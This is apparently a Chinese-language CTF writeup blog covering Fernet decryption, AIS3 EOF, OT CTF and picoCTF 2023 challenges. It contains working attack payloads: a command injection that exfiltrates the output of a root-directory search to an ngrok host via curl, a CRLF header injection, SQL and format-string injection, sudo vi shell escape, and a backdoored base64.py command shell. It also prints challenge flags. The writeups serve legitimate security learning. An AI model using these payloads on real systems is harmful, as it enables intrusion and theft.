<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Fernet"><a href="#Fernet" class="headerlink" title="Fernet"></a>Fernet</h2><pre><code>你所在的公司最近發生了一起駭客入侵事件，管理員發現駭客使用 Fernet 密碼學來加密了他們的敏感數據。
你需要解開被加密的檔案，否則事情就大條了！

flag format : FLAG&#123;xxx&#125;

Auther : Richard ( dogxxx)
</code></pre>
<h3 id="看code"><a href="#看code" class="headerlink" title="看code"></a>看code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext, password</span>):</span><br><span class="line">    salt = os.urandom(<span class="number">16</span>)  </span><br><span class="line">    key = PBKDF2(password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">    f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">    ciphertext = f.encrypt(plaintext.encode())  </span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(salt + ciphertext).decode()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage:</span></span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">plaintext = FLAG</span><br><span class="line"></span><br><span class="line"><span class="comment"># Encrypt</span></span><br><span class="line">ciphertext = encrypt(plaintext, leak_password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted data:&quot;</span>,ciphertext)</span><br></pre></td></tr></table></figure>
<h3 id="絲路"><a href="#絲路" class="headerlink" title="絲路"></a>絲路</h3><pre><code>密碼都給你了所以反著解密就好了
</code></pre>
<p>加密流程是:產生salt-&gt;產生key-&gt;用key加密flag-&gt;把salt+ciphertext用base64 encode起來<br>所以其實salt也給你了就是base64 decode後的前16個char</p>
<h3 id="decrypt-code"><a href="#decrypt-code" class="headerlink" title="decrypt code"></a>decrypt code</h3><p>解密流程:base64 decode-&gt;取得salt、ciphertext-&gt;用password、salt重建key-&gt;用key解密ciphertext</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line">cipher=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">iAkZMT9sfXIjD3yIpw0ldGdBQUFBQUJrVzAwb0pUTUdFbzJYeU0tTGQ4OUUzQXZhaU9HMmlO</span></span><br><span class="line"><span class="string">aC1PcnFqRUIzX0xtZXg0MTh1TXFNYjBLXzVBOVA3a0FaenZqOU1sNGhBcHR3Z21RTTdmN1dQUkcxZ1Ja</span></span><br><span class="line"><span class="string">OGZLQ0E0WmVMSjZQTXN3Z252VWRtdXlaVW1fZ0pzV0xsaUM5VjR1ZHdj</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">cipher=cipher.encode()</span><br><span class="line">cipher=base64.b64decode(cipher)</span><br><span class="line">salt=cipher[:<span class="number">16</span>]</span><br><span class="line">cipher=cipher[<span class="number">16</span>:]</span><br><span class="line"><span class="built_in">print</span>(salt)</span><br><span class="line"><span class="built_in">print</span>(cipher)</span><br><span class="line">leak_password = <span class="string">&#x27;mysecretpassword&#x27;</span></span><br><span class="line">key = PBKDF2(leak_password.encode(), salt, <span class="number">32</span>, count=<span class="number">1000</span>, hmac_hash_module=SHA256)  </span><br><span class="line">f = Fernet(base64.urlsafe_b64encode(key))  </span><br><span class="line">plaintext=f.decrypt(cipher)</span><br><span class="line"><span class="built_in">print</span>(plaintext)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>FLAG{W3lc0m3_t0_th3_CTF_W0rld_!!<em>!!!</em>!}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2024-02-06T13:09:56.000Z" title="2024/2/6 下午9:09:56">2024-02-06</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:45:24.524Z" title="2024/11/17 下午12:45:24">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">4 分鐘讀完 (大約559個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2024/02/06/2024-AIS3-EOF-CTF-Qual-writeup/">2024 AIS3 EOF CTF Qual writeup</a></p><div class="content"><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="nslookup-final"><a href="#nslookup-final" class="headerlink" title="nslookup final"></a>nslookup final</h3><p>有command injection，用&#96;&#96;把指令包起來，但是會有一個問題就是他不會回傳結果，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl webhook.trianglesnake.com/?text=123</span><br></pre></td></tr></table></figure>

<p>呼叫聊天機器人webhook試試看，有收到訊息，所以直接把flag偷出來</p>
<p>因為有WAF限制<code>flag</code>、<code>*</code>，但我知道flag的prefix了，所以直接遍歷根目錄檔案找出flag</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">`curl -G https://eec1-182-234-154-17.ngrok-free.app/ --data-urlencode </span><br><span class="line"><span class="string">&quot;<span class="subst">$(find / -maxdepth 1 -type f -exec grep &#x27;ais3&#x27; &#123;&#125; +)</span>&quot;</span>`</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{jUST_3a$y_cOMmaND_INj3c7I0N}</p>
</blockquote>
<h3 id="internal"><a href="#internal" class="headerlink" title="internal"></a>internal</h3><p>沒辦法碰到<code>/flag</code>但是如果由內網機器送redirect請求並包含<code>X-Accel-Redirect</code>header就可以穿透。</p>
<p>這題在考crlf截斷，截斷之後可以header injection</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.105.0.21:11580/?redir=https://www.google.com%0d%0aX-Accel-Redirect:%20/flag</span><br></pre></td></tr></table></figure>

<blockquote>
<p>AIS3{JUsT_s0m3_FUnNy_N91NX_FEaturE}</p>
</blockquote>
<h3 id="copypasta"><a href="#copypasta" class="headerlink" title="copypasta"></a>copypasta</h3><p>題目有sql injection，用sqlmap dump出所有column後可以直接存取&#x2F;posts&#x2F;flag_id，但他會檢查cookie，所以絲路變成：透過sql injection創建不存在的貼文-&gt;透過string format撈出<code>app.secret_key</code>-&gt;偽造cookie-&gt;存取flag頁面</p>
<h4 id="透過sql-injection創造貼文"><a href="#透過sql-injection創造貼文" class="headerlink" title="透過sql injection創造貼文"></a>透過sql injection創造貼文</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#source code</span></span><br><span class="line">tmpl = db().cursor().execute(</span><br><span class="line">        <span class="string">f&quot;SELECT * FROM copypasta_template WHERE id = <span class="subst">&#123;<span class="built_in">id</span>&#125;</span>&quot;</span></span><br><span class="line">    ).fetchone()</span><br></pre></td></tr></table></figure>
<p>這裡很明顯留了一個洞給我們</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;&#123;field.__class__....&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>此時下面進行format string的時候就會被injection</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res = content.<span class="built_in">format</span>(field=request.form)</span><br></pre></td></tr></table></figure>

<p>這題沒有做出來，卡在Pyton format string漏洞，可以摸到magic method，但是因為在不同namespace沒辦法用__global__撈到<code>app.secret_key</code></p>
<h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="stateful"><a href="#stateful" class="headerlink" title="stateful"></a>stateful</h3><p>把整個流程反過來做一次 真reversed engineering<br>先用ghidra把C弄出來後用vs code 的取代把每個function改成printf，之後用python把出來的function整個反過來</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">3618225054(k_target)</span></span><br><span class="line"><span class="string">2057902921(k_target)</span></span><br><span class="line"><span class="string">671274660(k_target)</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">557589375(k_target)</span></span><br><span class="line"><span class="string">3420754995(k_target)</span></span><br><span class="line"><span class="string">3648003850(k_target)</span></span><br><span class="line"><span class="string">1978986903(k_target)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">lst = string.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">lst.reverse()</span><br><span class="line"><span class="built_in">print</span>(lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;state_&#x27;</span>+i+<span class="string">&#x27;;&#x27;</span>)</span><br></pre></td></tr></table></figure>


<p>把每個狀態機的function<code>+</code>改成<code>-</code>，然後把<code>k_target</code>逆向回推</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Hello world! Cplayground is an online sandbox that makes it easy to try out</span></span><br><span class="line"><span class="comment">// code.</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> local_14 = <span class="number">1</span>;</span><br><span class="line">  <span class="type">int</span> local_10 = <span class="number">0</span>;</span><br><span class="line">  <span class="type">unsigned</span> local_c = <span class="number">0xd7a9bb9e</span>;</span><br><span class="line">  <span class="type">bool</span> bVar1 = <span class="literal">false</span>;</span><br><span class="line">  <span class="type">char</span> k_target[<span class="number">43</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">38</span>,</span><br><span class="line">  <span class="number">75</span>,</span><br><span class="line">  ...</span><br><span class="line">  <span class="number">128</span>,</span><br><span class="line">  <span class="number">101</span>,</span><br><span class="line">  <span class="number">-20</span>,</span><br><span class="line">  <span class="number">125</span></span><br><span class="line">&#125;;</span><br><span class="line">  </span><br><span class="line">state_1978986903(k_target);</span><br><span class="line">state_3648003850(k_target);</span><br><span class="line">state_3420754995(k_target);</span><br><span class="line">state_557589375(k_target);</span><br><span class="line">...</span><br><span class="line">state_2057902921(k_target);</span><br><span class="line">state_3618225054(k_target);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">44</span>;i++)&#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,k_target[i]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>基本上就是反著做一遍</p>
<blockquote>
<p>AIS3{Ar3_y0U_@_sTAtEfuL_Or_S7AT3L3SS_ctfer}</p>
</blockquote>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-12-20T02:25:29.000Z" title="2023/12/20 上午10:25:29">2023-12-20</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:44:19.646Z" title="2024/11/17 下午12:44:19">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">2 分鐘讀完 (大約305個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/12/20/OT-CTF-writeup/">OT CTF writeup</a></p><div class="content"><h2 id="惡意軟體分析"><a href="#惡意軟體分析" class="headerlink" title="惡意軟體分析"></a>惡意軟體分析</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||10.15.1.69:3128||<br>難度:中</p>
</blockquote>
<ol>
<li>打開ida pro</li>
<li>查看import table</li>
<li>查看是否有網路連線相關api</li>
<li>查看 WinHttpOpen functoin的Reference</li>
<li>在edi中找到中繼伺服器ip和port</li>
</ol>
<h2 id="惡意軟體分析2"><a href="#惡意軟體分析2" class="headerlink" title="惡意軟體分析2"></a>惡意軟體分析2</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag{5.39.218.152}||</p>
</blockquote>
<h2 id="加密系統"><a href="#加密系統" class="headerlink" title="加密系統"></a>加密系統</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||flag_EnCryp1||<br>難度:難</p>
</blockquote>
<ol>
<li>使用<a href="factordb.com">factordb.com</a>分解n</li>
<li>因為e是2，所以不可能為RSA，猜測為rabin算法</li>
<li>有$p、q$了，所以順著把$m_p、m_q$求出來，會有四組明文</li>
<li>找可以讀的明文就是flag了</li>
</ol>
<h2 id="工業app分析"><a href="#工業app分析" class="headerlink" title="工業app分析"></a>工業app分析</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||Flag {g6ghfchijv55fhh8gdd}||<br>難度:易</p>
</blockquote>
<ol>
<li>題目有附apktool，用apktool decode apk</li>
<li>摸一摸就找到flag了</li>
</ol>
<h2 id="Level-L-Modbus異常封包"><a href="#Level-L-Modbus異常封包" class="headerlink" title="Level_L] Modbus異常封包"></a>Level_L] Modbus異常封包</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||THISISAOTCTFEASYFLAG||<br>難度:易</p>
</blockquote>
<ol>
<li>題目說是意外擲回，直接用filter過濾exception</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">modbus.exception_code</span><br></pre></td></tr></table></figure>
<ol start="2">
<li>查看request內容<br><img src="https://hackmd.io/_uploads/ry-moCTBp.png" alt="image"></li>
</ol>
<h2 id="Level-L-Modbus異常封包-1"><a href="#Level-L-Modbus異常封包-1" class="headerlink" title="Level_L] Modbus異常封包"></a>Level_L] Modbus異常封包</h2><blockquote>
<p>[name&#x3D;trianglesnake]<br>flag:||AN APPLE A DAY KEEPS THE DOCTOR AWAY||<br>難度:易</p>
</blockquote>
<ol>
<li>藏訊息發給PLC，若沒有拆開封包<code>length</code>一定會很長</li>
<li>找<code>length</code>最長的封包</li>
</ol>
<p><img src="https://hackmd.io/_uploads/By1piR6rp.png" alt="image"></p>
<blockquote>
<p>比別的封包多一坨hex的資料</p>
</blockquote>
<ol start="3">
<li>把hex轉成ascii，得到flag</li>
</ol>
<p><img src="https://hackmd.io/_uploads/HkGAG01PT.png" alt="image"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2023-05-29T12:31:19.000Z" title="2023/5/29 下午8:31:19">2023-05-29</time>發表</span><span class="level-item"><time dateTime="2024-11-17T04:44:26.773Z" title="2024/11/17 下午12:44:26">2024-11-17</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Cybersecurity/">Cybersecurity</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/">CTF</a><span> / </span><a class="link-muted" href="/categories/Cybersecurity/CTF/Writeup/">Writeup</a></span><span class="level-item">12 分鐘讀完 (大約1813個字)</span></div></div><p class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2023/05/29/picoCTF-writeup/">picoCTF 2023 writeup</a></p><div class="content"><h2 id="Binary-Exploitation"><a href="#Binary-Exploitation" class="headerlink" title="Binary Exploitation"></a>Binary Exploitation</h2><h3 id="hijacking"><a href="#hijacking" class="headerlink" title="hijacking"></a>hijacking</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Getting root access can allow you to read the flag. Luckily there is a 
python file that you might like to play with.
Through Social engineering, we&#39;ve got the credentials to use on the 
server. SSH is running on the server.
</code></pre>
<h4 id="隨便逛逛"><a href="#隨便逛逛" class="headerlink" title="隨便逛逛"></a>隨便逛逛</h4><p><img src="https://hackmd.io/_uploads/BkCIB9eLh.png"><br>發現&#x2F;challenge資料夾很可疑，但是沒辦法cd進去</p>
<p><img src="https://hackmd.io/_uploads/BJpdBcgIn.png"></p>
<p>查看sudo 發現使用者可以用sudo權限使用vi<br><img src="https://hackmd.io/_uploads/Hy6NrclIn.png"></p>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo vi</span><br><span class="line"></span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>
<p><img src="https://hackmd.io/_uploads/rkEI89xI3.png"><br>privilege escalation了，再來就直接A進去&#x2F;challenge&#x2F;把flag撈出來就好</p>
<p><img src="https://hackmd.io/_uploads/rkETIce8h.png"></p>
<blockquote>
<p>picoCTF{pYth0nn_libraryH!j@CK!n9_5a7b5866}</p>
</blockquote>
<h4 id="原本解法"><a href="#原本解法" class="headerlink" title="原本解法"></a>原本解法</h4><pre><code>這題當初在解的時候是在.server.py裡面import 的base64裡面搞鬼
只是不知道為甚麼在寫writeup的時候沒辦法用root權限執行.server.py
</code></pre>
<p>先<code>ls -al</code>發現有一個<code>.server.py</code></p>
<p><code>cat .server.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">ip = <span class="string">&#x27;picoctf.org&#x27;</span></span><br><span class="line">response = os.system(<span class="string">&quot;ping -c 1 &quot;</span> + ip)</span><br><span class="line"><span class="comment">#saving ping details to a variable</span></span><br><span class="line">host_info = socket.gethostbyaddr(ip)</span><br><span class="line"><span class="comment">#getting IP from a domaine</span></span><br><span class="line">host_info_to_str = <span class="built_in">str</span>(host_info[<span class="number">2</span>])</span><br><span class="line">host_info = base64.b64encode(host_info_to_str.encode(<span class="string">&#x27;ascii&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Hello, this is a part of information gathering&quot;</span>,<span class="string">&#x27;Host: &#x27;</span>, host_info)</span><br></pre></td></tr></table></figure>

<p><code>vim .server.py</code>沒辦法動<code>.server.py</code>，因為他是readonly，但是權限沒有設定到<code>base64.py</code></p>
<p><strong>在import file裡面加料</strong><br><code>vim /usr/lib/python3.8/base64.py</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    cmd=<span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(os.popen(cmd).read())</span><br></pre></td></tr></table></figure>

<p><strong>get shell</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo python3 .server.py</span><br></pre></td></tr></table></figure>

<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="hideme"><a href="#hideme" class="headerlink" title="hideme"></a>hideme</h3><pre><code>AUTHOR: GEOFFREY NJOGU

Description
Every file gets a flag.
The SOC analyst saw one image been sent back and forth between two
people. They decided to investigate and found out that there was more
than what meets the eye here.
</code></pre>
<p>下載下來發現是一張圖片<br>看一看感覺很正常</p>
<p>用<code>exiftool</code>看了一下沒有把flag藏在某個欄位裡</p>
<p><code>strings flag.png</code>看看<br><img src="https://hackmd.io/_uploads/BkC8pqxIn.png"><br>發現裡面有長得很像路徑的東東</p>
<p>直接把<code>flag.png</code>當成zip解壓縮看看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unzip flag.png</span><br></pre></td></tr></table></figure>
<p>得到半張flag<br><img src="https://hackmd.io/_uploads/r1xCia5lI2.png"></p>
<blockquote>
<p>picoCTF{Hiddinng_An_imag3_within_@n_ima9e_92076717}</p>
</blockquote>
<h3 id="FindAndOpen"><a href="#FindAndOpen" class="headerlink" title="FindAndOpen"></a>FindAndOpen</h3><pre><code>AUTHOR: MUBARAK MIKAIL

Description
Someone might have hidden the password in the trace file.
Find the key to unlock this file. This tracefile might be good to analyze.
</code></pre>
<p>這題給了兩個檔案，第一個是<code>flag.zip</code>和<code>dump.pcap</code>。<br>嘗試解壓縮<code>flag.zip</code>，發現需要密碼</p>
<h4 id="先從dump-pcap下手看看"><a href="#先從dump-pcap下手看看" class="headerlink" title="先從dump.pcap下手看看"></a>先從<code>dump.pcap</code>下手看看</h4><p>用wireshark打開<code>dump.pcap</code></p>
<p><img src="https://hackmd.io/_uploads/r11qn2eL2.png"><br>隨便看幾個封包後發現都有明文</p>
<p><img src="https://hackmd.io/_uploads/SyH7T2lUh.png"><br>找到一個超可疑的封包，<code>=</code>結尾很可能是base64編碼的填充字元</p>
<p>decode後得到半截flag</p>
<blockquote>
<p>This is the secret: picoCTF{R34DING_LOKd_</p>
</blockquote>
<p>回到<code>flag.zip</code>，直接通靈把第一段flag當密碼</p>
<blockquote>
<p>picoCTF{R34DING_LOKd_fil56_succ3ss_5ed3a878}</p>
</blockquote>
<p>??</p>
<h2 id="General-Skills"><a href="#General-Skills" class="headerlink" title="General Skills"></a>General Skills</h2><h3 id="money-ware"><a href="#money-ware" class="headerlink" title="money-ware"></a>money-ware</h3><pre><code>AUTHOR: JUNI19

Description
Flag format: picoCTF&#123;Malwarename&#125;
The first letter of the malware name should be capitalized and the rest 
lowercase.
Your friend just got hacked and has been asked to pay some bitcoins to 
1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX. He doesn’t seem to understand what is 
going on and asks you for advice. Can you identify what malware he’s 
being a victim of?
</code></pre>
<p>Google <code>1Mz7153HMuxXTuR2R1t78mGSdzaAtNbBWX</code></p>
<p>找到<a target="_blank" rel="noopener" href="https://www.cnbc.com/2017/06/28/ransomware-cyberattack-petya-bitcoin-payment.html">CNBC的新聞</a><br><img src="https://hackmd.io/_uploads/SkJ-yplUn.png"></p>
<blockquote>
<p>picoCTF{Petya}</p>
</blockquote>
<p>水爛</p>
<h3 id="repetitions"><a href="#repetitions" class="headerlink" title="repetitions"></a>repetitions</h3><pre><code>AUTHOR: THEONESTE BYAGUTANGAZA

Description
Can you make sense of this file?
Download the file here.
</code></pre>
<p>下載<code>enc_flag</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">VmpGU1EyRXlUWGxTYmxKVVYwZFNWbGxyV21GV1JteDBUbFpPYWxKdFVsaFpWVlUxWVZaS1ZWWnVh</span><br><span class="line">RmRXZWtab1dWWmtSMk5yTlZWWApiVVpUVm10d1VWZFdVa2RpYlZaWFZtNVdVZ3BpU0VKeldWUkNk</span><br><span class="line">MlZXVlhoWGJYQk9VbFJXU0ZkcVRuTldaM0JZVWpGS2VWWkdaSGRXCk1sWnpWV3hhVm1KRk5XOVVW</span><br><span class="line">VkpEVGxaYVdFMVhSbFZhTTBKWVZGWmFXbVZzV2tkWk0yaFRDbUpXV25sVVZtaFRWMGRHZEdWRlZs</span><br><span class="line">aGkKYlRrelZERldUMkpzUWxWTlJYTkxDZz09Cg==</span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;經典base64</p>
<p>decode後</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">VjFSQ2EyTXlSblJUV0dSVllrWmFWRmx0TlZOalJtUlhZVVU1YVZKVVZuaFdWekZoWVZkR2NrNVVX</span><br><span class="line">bUZTVmtwUVdWUkdibVZXVm5WUgpiSEJzWVRCd2VWVXhXbXBOUlRWSFdqTnNWZ3BYUjFKeVZGZHdW</span><br><span class="line">MlZzVWxaVmJFNW9UVVJDTlZaWE1XRlVaM0JYVFZaWmVsWkdZM2hTCmJWWnlUVmhTV0dGdGVFVlhi</span><br><span class="line">bTkzVDFWT2JsQlVNRXNLCg==</span><br></pre></td></tr></table></figure>

<p>再decode</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">V1RCa2MyRnRTWGRVYkZaVFltNVNjRmRXYUU5aVJUVnhWVzFhYVdGck5UWmFSVkpQWVRGbmVWVnVR</span><br><span class="line">bHBsYTBweVUxWmpNRTVHWjNsVgpXR1JyVFdwV2VsUlZVbE5oTURCNVZXMWFUZ3BXTVZZelZGY3hS</span><br><span class="line">bVZyTVhSWGFteEVXbm93T1VOblBUMEsK</span><br></pre></td></tr></table></figure>

<p>de</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WTBkc2FtSXdUbFZTYm5ScFdWaE9iRTVxVW1aaWFrNTZaRVJPYTFneVVuQlpla0pyU1ZjME5GZ3lV</span><br><span class="line">WGRrTWpWelRVUlNhMDB5VW1aTgpWMVYzVFcxRmVrMXRXamxEWnowOUNnPT0K</span><br></pre></td></tr></table></figure>
<p>deeee</p>
